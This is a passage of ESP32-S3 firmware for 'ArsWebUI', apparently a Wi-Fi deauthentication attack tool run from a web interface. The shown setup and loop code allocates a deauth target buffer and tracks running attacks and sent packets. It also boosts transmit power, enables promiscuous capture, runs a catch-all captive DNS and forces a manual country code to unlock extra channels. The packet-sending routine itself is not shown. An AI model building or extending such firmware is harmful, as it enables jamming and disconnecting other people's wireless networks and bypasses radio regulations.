      macRandEnabled = (r->getParam("mac_rand")->value() == "1");
    r->send(200,"text/plain","OK");
  });

  server.onNotFound([](AsyncWebServerRequest* r) { r->redirect("/"); });
}

// ─── SETUP ───────────────────────────────────────────────────────────────────
void setup() {
  // Never call disableCore0/1WDT on S3 — causes task_wdt spam.

  Serial0.begin(115200);
  delay(200);
  Serial0.println("\n==========================================");
  Serial0.println("  ArsWebUI v2.8 — ESP32-S3 N16R8");
  Serial0.println("==========================================\n");

  // ── NeoPixel: claim before anything else ────────────────────────────────
  led.begin();
  led.setBrightness(80);
  led.clear();
  led.show();
  delay(10);
  setLedState(LS_BLUE);
  updateLED();             // solid blue = booting
  INFO("LED initialized (GPIO%d)", LED_PIN);

  // ── Semaphores ────────────────────────────────────────────────────────────
  attackMutex  = xSemaphoreCreateMutex();
  clientsMutex = xSemaphoreCreateMutex();
  logMutex     = xSemaphoreCreateMutex();
  if (!attackMutex || !clientsMutex || !logMutex) {
    Serial0.println("[FATAL] Mutex init failed");
    setLedState(LS_RED); updateLED();
    while (1) delay(1000);
  }

  // ── PSRAM target buffer ───────────────────────────────────────────────────
  psramAvailable = psramFound();
  if (psramAvailable) {
    psramTargets = (DeauthTarget*)heap_caps_malloc(
      sizeof(DeauthTarget) * MAX_PSRAM_TARGETS, MALLOC_CAP_SPIRAM);
    if (psramTargets) {
      INFO("PSRAM OK — target buffer %u bytes allocated",
           (unsigned)(sizeof(DeauthTarget) * MAX_PSRAM_TARGETS));
    } else {
      psramAvailable = false;
      ERR("PSRAM malloc failed — will use heap fallback");
    }
  } else {
    INFO("PSRAM not detected — heap fallback for target buffer");
  }

  // ── NVS + Preferences ────────────────────────────────────────────────────
  esp_err_t nvs = nvs_flash_init();
  if (nvs == ESP_ERR_NVS_NO_FREE_PAGES || nvs == ESP_ERR_NVS_NEW_VERSION_FOUND) {
    nvs_flash_erase(); nvs_flash_init();
  }
  prefs.begin("arsweb", false);

  // Country code BEFORE WiFi.mode — some S3 IDF builds lock country at mode-set time.
  // PH: ch1-13, 20 dBm max, POLICY_MANUAL ignores AP country IE.
  // This is the real unlock for ch12/13; without it set_channel returns ESP_FAIL
  // even with internal_tx because the channel is rejected at the PHY config layer.
  {
    wifi_country_t cc;
    memset(&cc, 0, sizeof(cc));
    cc.cc[0] = 'P'; cc.cc[1] = 'H'; cc.cc[2] = '\0';
    cc.schan        = 1;
    cc.nchan        = 13;
    cc.max_tx_power = 20;
    cc.policy       = WIFI_COUNTRY_POLICY_MANUAL;
    esp_err_t r = esp_wifi_set_country(&cc);
    Serial0.printf("[INFO] Country pre-mode PH: %s\n", r == ESP_OK ? "OK" : "FAIL(ignored,retry after mode)");
  }

  WiFi.persistent(false);
  WiFi.mode(WIFI_OFF);
  delay(200);
  WiFi.mode(WIFI_AP_STA);
  delay(300);

  // Set country again after mode change — belt and suspenders
  {
    wifi_country_t cc;
    memset(&cc, 0, sizeof(cc));
    cc.cc[0] = 'P'; cc.cc[1] = 'H'; cc.cc[2] = '\0';
    cc.schan        = 1;
    cc.nchan        = 13;
    cc.max_tx_power = 20;
    cc.policy       = WIFI_COUNTRY_POLICY_MANUAL;
    esp_err_t r = esp_wifi_set_country(&cc);
    Serial0.printf("[INFO] Country post-mode PH: %s\n", r == ESP_OK ? "OK" : "FAIL");
  }

  String apSSID = prefs.getString("ap_ssid", AP_SSID_DEFAULT);
  String apPass = prefs.getString("ap_pass", AP_PASS_DEFAULT);
  if (apSSID.length() == 0 || apSSID.length() > 32) apSSID = AP_SSID_DEFAULT;
  if (apPass.length() < 8 || apPass.length() > 63) apPass = AP_PASS_DEFAULT;

  bool apOk = false;
  for (int attempt = 0; attempt < 8 && !apOk; attempt++) {
    INFO("softAP attempt %d SSID=%s", attempt + 1, apSSID.c_str());
    apOk = WiFi.softAP(apSSID.c_str(), apPass.c_str(), AP_CHANNEL, 0, 4);
    if (!apOk) {
      ERR("softAP fail %d — cycle radio", attempt + 1);
      delay(400);
      WiFi.mode(WIFI_OFF); delay(150);
      WiFi.mode(WIFI_AP_STA); delay(250);
    }
  }
  if (!apOk) apOk = WiFi.softAP("ArsWebUI-OPEN", NULL, AP_CHANNEL, 0, 4);
  if (!apOk) {
    Serial0.println("[FATAL] softAP failed");
    setLedState(LS_RED); updateLED();
    while (1) { updateLED(); delay(500); }
  }
  delay(300);

  WiFi.softAPmacAddress(ownBSSIDap);
  WiFi.macAddress(ownBSSID);

  INFO("AP  SSID : %s", apSSID.c_str());
  INFO("AP  PASS : %s", apPass.c_str());
  INFO("AP  IP   : %s", WiFi.softAPIP().toString().c_str());
  INFO("AP  BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
    ownBSSIDap[0],ownBSSIDap[1],ownBSSIDap[2],
    ownBSSIDap[3],ownBSSIDap[4],ownBSSIDap[5]);

  // ── TX power ──────────────────────────────────────────────────────────────
  boostTxPower();
  esp_wifi_set_channel(AP_CHANNEL, WIFI_SECOND_CHAN_NONE);
  delay(30);

  // ── Promiscuous — AFTER AP confirmed (avoids "not in regular mode") ───────
  startPromiscuous();

  // ── Optional STA connection ───────────────────────────────────────────────
  String cs = prefs.getString("client_ssid", "");
  if (cs.length() > 0) {
    String cp = prefs.getString("client_pass", "");
    cs.toCharArray(client_ssid, 64);
    cp.toCharArray(client_pass, 64);
    WiFi.begin(client_ssid, client_pass);
    INFO("STA connecting: %s", client_ssid);
  }

  // ── DNS + Web server ──────────────────────────────────────────────────────
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  setupServer();
  server.begin();

  logEvent("Boot OK — v2.8. AP: %s  Heap: %u  PSRAM: %s",
    apSSID.c_str(), ESP.getFreeHeap(), psramAvailable ? "YES" : "NO");

  Serial0.printf("[INFO] Web UI: http://%s\n", WiFi.softAPIP().toString().c_str());
  Serial0.printf("[INFO] Free heap: %u bytes\n", ESP.getFreeHeap());

  setLedState(LS_GREEN);  // ready
}

// ─── LOOP ────────────────────────────────────────────────────────────────────
void loop() {
  dnsServer.processNextRequest();
  updateLED();  // LED is driven here — only place led.show() runs

  static unsigned long lastCheck = 0;
  if (millis() - lastCheck > 5000) {
    lastCheck = millis();

    const bool nowConn = (WiFi.status() == WL_CONNECTED);
    if (nowConn && !client_connected) {
      client_connected = true;
      client_ip = WiFi.localIP().toString();
      logEvent("STA up: %s  RSSI:%d dBm", client_ip.c_str(), WiFi.RSSI());
    } else if (!nowConn && client_connected) {
      client_connected = false;
      logEvent("STA disconnected");
    }

    // Do not auto-stop attacks from loop — only /stop does that
    if (ESP.getFreeHeap() < HEAP_MIN && attackRunning) {
      ERR("Heap low (%u) — attack still running", ESP.getFreeHeap());
    }

    DBG("Heap:%u Up:%lus Attacks:%s Pkts:%lu Clients:%d LED:%d",
      ESP.getFreeHeap(), millis()/1000,
      attackRunning ? "ON" : "OFF",
      packetsSent, numClients, (int)ledState);
  }

  delay(5);
}
